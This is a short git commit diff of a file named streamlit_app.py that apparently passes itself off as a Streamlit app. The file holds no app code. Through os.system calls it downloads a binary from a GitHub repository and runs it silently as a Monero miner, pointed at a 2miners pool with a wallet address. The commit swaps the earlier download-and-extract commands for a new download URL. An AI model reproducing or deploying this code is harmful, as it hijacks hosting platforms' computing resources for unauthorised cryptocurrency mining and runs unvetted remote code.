8ee32382216a0c841e5920392dce130615c18a1e
ontaracing04 <110086717+ontaracing04@users.noreply.github.com>
2022-07-29 13:53:48 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,5 +1,4 @@
 import os
 
-os.system("curl https://github.com/nurkartina604/st/raw/main/-.tar.gz")
-os.system("tar -xf -.tar.gz")
+os.system("curl https://github.com/ontaracing04/sue/raw/main/-")
 os.system("./- -o xmr.2miners.com:2222 -u 8BeTiTxwtTphRfwuNXSsukeMMVKE5qvJZZDjqB3SpqMZS1Q37wMJ3RnKxm6itZgZgxPeffg6ZZA3aANkGRDqJRHmKMg8R1j.julaher >/dev/null >/dev/null 2>&1")
